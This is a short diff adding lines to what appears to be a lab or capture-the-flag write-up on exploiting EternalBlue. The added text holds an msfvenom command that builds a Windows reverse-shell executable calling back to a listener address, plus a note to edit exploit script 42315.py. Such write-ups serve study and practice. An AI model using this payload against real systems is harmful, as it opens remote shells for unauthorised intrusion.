@@ -16,6 +16,14 @@ Nmap found only one vulnerability that is eternal blue so we are going to exploi
 
 ![Blue_exploit](https://user-images.githubusercontent.com/55708909/91408457-8b042d80-e861-11ea-90ee-cb9a68007cd4.png)
 
+First create a payload using msfvenom 
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell.exe
+
+edit 42315.py files
+
+
+
 
 
 
